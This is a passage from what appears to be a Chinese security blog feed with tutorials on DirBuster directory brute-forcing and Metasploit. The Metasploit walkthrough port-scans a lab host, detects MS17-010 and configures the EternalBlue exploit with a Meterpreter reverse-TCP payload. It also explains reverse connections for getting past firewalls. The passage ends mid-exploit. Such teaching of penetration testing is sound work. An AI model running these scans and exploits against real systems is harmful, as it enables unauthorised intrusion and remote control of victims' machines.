      <link href="/blog/addc4e16.html/"/>
      <url>/blog/addc4e16.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：概述"><a href="#一：概述" class="headerlink" title="一：概述"></a>一：概述</h1><p>DirBuster 一款网站目录文件扫描工具，支持全部的 Web 目录扫描方式，用于探测 web 服务器上的目录和隐藏文件的。它既支持网页爬虫方式扫描，也支持基于字典暴力扫描，还支持纯暴力扫描。该工具使用 java 语言编写，提供命令行和图形界面两种模式。其中，图形界面模式功能更为强大。用户不仅可以指定纯暴力扫描的字符规则，还可以设置以 URL 模糊方式构建网页路径。同时，用户还对网页解析方式进行各种定制，提高网页解析效率。</p><h1 id="二：命令"><a href="#二：命令" class="headerlink" title="二：命令"></a>二：命令</h1><h2 id="2-1-启动"><a href="#2-1-启动" class="headerlink" title="2.1 启动"></a>2.1 启动</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">命令行启动</span></span><br><span class="line">disbuster</span><br><span class="line">Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true</span><br><span class="line">Starting OWASP DirBuster 1.0-RC1</span><br></pre></td></tr></table></figure><p><img src="/blog/addc4e16.html/image-20221128112835660.png"></p><h2 id="2-2-配置相关参数"><a href="#2-2-配置相关参数" class="headerlink" title="2.2 配置相关参数"></a>2.2 配置相关参数</h2><ul><li>Target URL：目标ip地址或者域名，默认端口80，特殊端口需要补全</li><li>Work Method：请求方式，使用 GET 请求或者 HEAD 和 GET 自动切换</li><li>Number Of Threads：选择线程数，用于执行暴力破解的线程数，取决于攻击机的计算机硬件。</li><li>Select scanning type：选择字典类型<ul><li>List based brute force：基于列表的暴力</li><li>Pure Brute Force：纯粹的暴力（自动生成，无需配置字典）</li></ul></li><li>File with list of dirs&#x2F;files：带有目录&#x2F;文件列表的文件</li><li>Select starting options：选择扫描方式<ul><li>Standard start point：标准起点<ul><li>Brute Froce Dirs：纯暴力目录</li><li>Brute Froce Files：纯暴力文件</li><li>Be Recursive：递归</li><li>Use Blank Extension：延伸，使用空白拓展名</li><li>Dir to start with：开始路径</li><li>File extension：文件拓展名</li></ul></li><li>URL Fuzz （URL 模糊）<ul><li>{dir}：表示在 dir 前后可以随意拼接想要的目录或者后缀；</li><li>例如：”&#x2F;admin&#x2F;{dir}.html”，表示扫描admin目录下的所有html文件；</li></ul></li></ul></li></ul><h2 id="2-3-执行"><a href="#2-3-执行" class="headerlink" title="2.3 执行"></a>2.3 执行</h2><p>点击 start 开始；</p><h2 id="2-4-查看结果"><a href="#2-4-查看结果" class="headerlink" title="2.4 查看结果"></a>2.4 查看结果</h2><ul><li>scan information：扫描信息</li><li>Rseult - List View：结果列表</li><li>Result - Tree View：结果树</li><li>Errors：错误</li></ul><h2 id="2-5-常见响应"><a href="#2-5-常见响应" class="headerlink" title="2.5 常见响应"></a>2.5 常见响应</h2><ul><li>200：文件存在</li><li>404：服务器中不存在该文件</li><li>301：这是重定向到给定的URL</li><li>401：访问此文件需要身份验证；</li><li>403：请求有效但服务器拒绝响应；</li></ul><h2 id="2-6-导出"><a href="#2-6-导出" class="headerlink" title="2.6 导出"></a>2.6 导出</h2><p>Report：导出报告</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit framework 使用教程</title>
      <link href="/blog/47950b11.html/"/>
      <url>/blog/47950b11.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：概述"><a href="#一：概述" class="headerlink" title="一：概述"></a>一：概述</h1><p>Metasploit framework （MSF）是一款开源安全漏洞检测工具，附带数千个已知的软件漏洞，并保持持续更新。Metasploit 可以用于信息收集、漏洞探测、漏洞利用等渗透测试的全流程，被安全社区冠以“可以黑掉整个宇宙”之名。</p><h1 id="二：模块功能"><a href="#二：模块功能" class="headerlink" title="二：模块功能"></a>二：模块功能</h1><h2 id="2-1-启动"><a href="#2-1-启动" class="headerlink" title="2.1 启动"></a>2.1 启动</h2><p>漏洞利用工具集中打开；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用命令行打开</span></span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">       =[ metasploit v6.2.9-dev                           ]</span><br><span class="line">+ -- --=[ 2230 exploits - 1177 auxiliary - 398 post       ]</span><br><span class="line">+ -- --=[ 867 payloads - 45 encoders - 11 nops            ]</span><br><span class="line">+ -- --=[ 9 evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit tip: When in a module, use back to go </span><br><span class="line">back to the top level prompt</span><br></pre></td></tr></table></figure><p>这里一共提供了7个种类的模块，功能如下：</p><ul><li>exploits：漏洞渗透模块，我们在发现漏洞之后，就可以使用这类模块实现快速渗透。根据漏洞或者系统名称，可以搜索出对应的漏洞模块，然后使用模块，设置几个简单的参数，然后再执行运用这个模块，完成入侵。</li><li>auxiliary：辅助模块，用于信息收集，使用此类模块就可以完成信息收集的任务。</li><li>post：后渗透攻击模块，当我们拿到目标系统的控制权限之后，为了绕开系统的保护机制，我们可以使用此类模块。它可以帮助我们提高控制权限，进而获取敏感信息和实施跳板攻击。</li><li>payload：攻击载荷模块，通过它我们可以实现对目标的远程控制。</li></ul><h2 id="2-2-信息收集"><a href="#2-2-信息收集" class="headerlink" title="2.2 信息收集"></a>2.2 信息收集</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用 msf 的扫描模块，可以查看大量的扫描模块</span> </span><br><span class="line">msf6 &gt; search scanner</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">   # </span><span class="language-bash">   Name                                                                     Disclosure Date  Rank    Check  Description</span></span><br><span class="line">   -    ----                                                                     ---------------  ----    -----  -----------</span><br><span class="line">   0    auxiliary/scanner/http/a10networks_ax_directory_traversal                2014-01-28       normal  No     A10 Networks AX Loadbalancer Directory Traversal</span><br><span class="line">   1    auxiliary/scanner/snmp/aix_version                                                        normal  No     AIX SNMP Scanner Auxiliary Module</span><br><span class="line">   2    auxiliary/scanner/discovery/arp_sweep                                                     normal  No     ARP Sweep Local Network Discovery</span><br><span class="line">...</span><br><span class="line">   614  auxiliary/scanner/rservices/rexec_login                                                   normal  No     rexec Authentication Scanner</span><br><span class="line">   615  auxiliary/scanner/rservices/rlogin_login                                                  normal  No     rlogin Authentication Scanner</span><br><span class="line">   616  auxiliary/scanner/rservices/rsh_login                                                     normal  No     rsh Authentication Scanner</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 616, use 616 or use auxiliary/scanner/rservices/rsh_login</span><br><span class="line">通过名称或者索引与模块交互。例如: info 616, use 616 或者 use auxiliary/scanner/rservices/rsh_login</span><br></pre></td></tr></table></figure><h3 id="（1）以-syn-扫描模块为例"><a href="#（1）以-syn-扫描模块为例" class="headerlink" title="（1）以 syn 扫描模块为例"></a>（1）以 syn 扫描模块为例</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用 syn 模块</span></span><br><span class="line">msf6 &gt; use auxiliary/scanner/portscan/syn </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">显示参数</span></span><br><span class="line">msf6 auxiliary(scanner/portscan/syn) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/portscan/syn):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   BATCHSIZE  256              yes       The number of hosts to scan per set</span><br><span class="line">   DELAY      0                yes       The delay between connections, per thread, in milliseconds</span><br><span class="line">   INTERFACE                   no        The name of the interface</span><br><span class="line">   JITTER     0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.</span><br><span class="line">   PORTS      1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)</span><br><span class="line">   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit</span><br><span class="line">   SNAPLEN    65535            yes       The number of bytes to capture</span><br><span class="line">   THREADS    1                yes       The number of concurrent threads (max one per host)</span><br><span class="line">   TIMEOUT    500              yes       The reply read timeout in milliseconds</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置目标主机 IP</span></span><br><span class="line">msf6 auxiliary(scanner/portscan/syn) &gt; set RHOSTS 192.168.80.1</span><br><span class="line">RHOSTS =&gt; 192.168.80.1</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置线程数</span></span><br><span class="line">msf6 auxiliary(scanner/portscan/syn) &gt; set THREADS 40</span><br><span class="line">THREADS =&gt; 40</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">再次查看设置参数</span></span><br><span class="line">msf6 auxiliary(scanner/portscan/syn) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/portscan/syn):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   BATCHSIZE  256              yes       The number of hosts to scan per set</span><br><span class="line">   DELAY      0                yes       The delay between connections, per thread, in milliseconds</span><br><span class="line">   INTERFACE                   no        The name of the interface</span><br><span class="line">   JITTER     0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.</span><br><span class="line">   PORTS      1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)</span><br><span class="line">   RHOSTS     192.168.80.1     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit</span><br><span class="line">   SNAPLEN    65535            yes       The number of bytes to capture</span><br><span class="line">   THREADS    40               yes       The number of concurrent threads (max one per host)</span><br><span class="line">   TIMEOUT    500              yes       The reply read timeout in milliseconds</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动信息收集</span></span><br><span class="line">msf6 auxiliary(scanner/portscan/syn) &gt; run</span><br><span class="line"> </span><br><span class="line">[+]  TCP OPEN 192.168.80.1:135</span><br><span class="line">[+]  TCP OPEN 192.168.80.1:139</span><br><span class="line">[+]  TCP OPEN 192.168.80.1:443</span><br><span class="line">[+]  TCP OPEN 192.168.80.1:445</span><br><span class="line">[+]  TCP OPEN 192.168.80.1:1433</span><br><span class="line">[+]  TCP OPEN 192.168.80.1:3306</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><h3 id="（2）使用-nmap-扫描"><a href="#（2）使用-nmap-扫描" class="headerlink" title="（2）使用 nmap 扫描"></a>（2）使用 nmap 扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-vV：进行版本探测</span></span><br><span class="line">msf6 &gt; nmap -sV 192.168.80.1</span><br><span class="line">[*] exec: nmap -sV 192.168.80.1</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-27 15:10 CST</span><br><span class="line">Nmap scan report for localhost (192.168.80.1)</span><br><span class="line">Host is up (0.00077s latency).</span><br><span class="line">Not shown: 994 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">443/tcp  open  ssl/http      Apache httpd</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2095</span><br><span class="line">3306/tcp open  mysql         MySQL 5.7.31-log</span><br><span class="line">MAC Address: 00:50:56:C0:00:08 (VMware)</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">已执行服务检测。请向 https://nmap.org/submit/ 报告任何不正常的结果。</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 17.86 seconds</span><br><span class="line">Nmap完成：在 17.86 秒内扫描了1个 IP 地址。</span><br></pre></td></tr></table></figure><h2 id="2-3-尝试攻击"><a href="#2-3-尝试攻击" class="headerlink" title="2.3 尝试攻击"></a>2.3 尝试攻击</h2><h2 id="Metasploit-中常见-payload"><a href="#Metasploit-中常见-payload" class="headerlink" title="Metasploit 中常见 payload"></a>Metasploit 中常见 payload</h2><h3 id="（1）连接方式"><a href="#（1）连接方式" class="headerlink" title="（1）连接方式"></a>（1）连接方式</h3><ul><li>windows&#x2F;meterpreter&#x2F;bind_tcp# 正向连接</li><li>windows&#x2F;meterpreter&#x2F;reverse_tcp              # 反向连接，常用</li><li>windows&#x2F;meterperter&#x2F;reverse_http             # 通过监听80端口的反向连接</li><li>windows&#x2F;meterperter&#x2F;reverse_https           # 通过监听443端口的反向连接</li></ul><h3 id="（2）使用场景"><a href="#（2）使用场景" class="headerlink" title="（2）使用场景"></a>（2）使用场景</h3><ul><li>正向连接：我们攻击主机在内网，而目标主机在外网。目标主机无法和我们建立主动连接，而且大多数真是环境下目标主机防火墙只会允许我们访问少量的端口。如80端口，而80端口的访问量很多，所以也就可能导致连接失败的可能。</li><li>反向连接：我们的攻击机和目标主机同时在外网或者内网，这样目标主机可以和我们建立主动连接，而且即使有防火墙也没关系，反向连接是用的比较多的一种。</li><li>反向连接80和反向连接443端口：被攻击机能主动连接到我们的主机，还有就是被攻击机的防火墙设置特别严格，就连被攻击机访问外部网络的流量也进行了严格的限制，只允许被攻击机的80端口或者443端口与外部通信。</li></ul><h3 id="（3）查看漏洞模块"><a href="#（3）查看漏洞模块" class="headerlink" title="（3）查看漏洞模块"></a>（3）查看漏洞模块</h3><p>exploit：攻击模块</p><p>auxiliary：辅助模块</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看漏洞模块</span></span><br><span class="line">msf6 auxiliary(scanner/portscan/syn) &gt; search ms17-010</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">   # </span><span class="language-bash"> Name                                      Disclosure Date  Rank     Check  Description</span></span><br><span class="line">   -  ----                                      ---------------  ----     -----  -----------</span><br><span class="line">   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</span><br><span class="line">   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br><span class="line">   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span><br><span class="line">   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection</span><br><span class="line">   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce</span><br></pre></td></tr></table></figure><h3 id="（4）使用辅助扫描模块测试"><a href="#（4）使用辅助扫描模块测试" class="headerlink" title="（4）使用辅助扫描模块测试"></a>（4）使用辅助扫描模块测试</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用辅助扫描模式进行探测</span></span><br><span class="line">msf6 auxiliary(scanner/portscan/syn) &gt; use auxiliary/scanner/smb/smb_ms17_010 </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">展示参数信息</span></span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/smb/smb_ms17_010):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting                                    Required  Description</span><br><span class="line">   ----         ---------------                                    --------  -----------</span><br><span class="line">   CHECK_ARCH   true                                               no        Check for architecture on vulnerable hosts</span><br><span class="line">   CHECK_DOPU   true                                               no        Check for DOUBLEPULSAR on vulnerable hosts</span><br><span class="line">   CHECK_PIPE   false                                              no        Check for named pipe on vulnerable hosts</span><br><span class="line">   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/na  yes       List of named pipes to check</span><br><span class="line">                med_pipes.txt</span><br><span class="line">   RHOSTS                                                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasplo</span><br><span class="line">                                                                             it</span><br><span class="line">   RPORT        445                                                yes       The SMB service port (TCP)</span><br><span class="line">   SMBDomain    .                                                  no        The Windows domain to use for authentication</span><br><span class="line">   SMBPass                                                         no        The password for the specified username</span><br><span class="line">   SMBUser                                                         no        The username to authenticate as</span><br><span class="line">   THREADS      1                                                  yes       The number of concurrent threads (max one per host)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置目标主机IP</span></span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; set RHOSTS 192.168.80.1</span><br><span class="line">RHOSTS =&gt; 192.168.80.1</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">确认参数信息</span></span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/smb/smb_ms17_010):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting                                    Required  Description</span><br><span class="line">   ----         ---------------                                    --------  -----------</span><br><span class="line">   CHECK_ARCH   true                                               no        Check for architecture on vulnerable hosts</span><br><span class="line">   CHECK_DOPU   true                                               no        Check for DOUBLEPULSAR on vulnerable hosts</span><br><span class="line">   CHECK_PIPE   false                                              no        Check for named pipe on vulnerable hosts</span><br><span class="line">   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/na  yes       List of named pipes to check</span><br><span class="line">                med_pipes.txt</span><br><span class="line">   RHOSTS       192.168.80.1                                       yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasplo</span><br><span class="line">                                                                             it</span><br><span class="line">   RPORT        445                                                yes       The SMB service port (TCP)</span><br><span class="line">   SMBDomain    .                                                  no        The Windows domain to use for authentication</span><br><span class="line">   SMBPass                                                         no        The password for the specified username</span><br><span class="line">   SMBUser                                                         no        The username to authenticate as</span><br><span class="line">   THREADS      1                                                  yes       The number of concurrent threads (max one per host)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行探测（目标主机 windows11 ）</span></span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; run</span><br><span class="line"></span><br><span class="line">[-] 192.168.80.1:445      - An SMB Login Error occurred while connecting to the IPC$ tree.</span><br><span class="line">[*] 192.168.80.1:445      - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行探测（目标主机 windows7）</span></span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 192.168.80.130:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7600 x64 (64-bit)</span><br><span class="line">[*] 192.168.80.130:445    - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><h3 id="（5）实施攻击"><a href="#（5）实施攻击" class="headerlink" title="（5）实施攻击"></a>（5）实施攻击</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">选择攻击模块</span></span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; use exploit/windows/smb/ms17_010_eternalblue </span><br><span class="line">[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置 payload 连接方式</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可使用 show payloads 查看适合要攻击的目标主机的payload</span></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">列出当前模块所需要配置的参数</span></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit</span><br><span class="line">   RPORT          445              yes       The target port (TCP)</span><br><span class="line">   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2,</span><br><span class="line">                                              Windows 7, Windows Embedded Standard 7 target machines.</span><br><span class="line">   SMBPass                         no        (Optional) The password for the specified username</span><br><span class="line">   SMBUser                         no        (Optional) The username to authenticate as</span><br><span class="line">   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Win</span><br><span class="line">                                             dows 7, Windows Embedded Standard 7 target machines.</span><br><span class="line">   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Wi</span><br><span class="line">                                             ndows Embedded Standard 7 target machines.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.80.128   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit 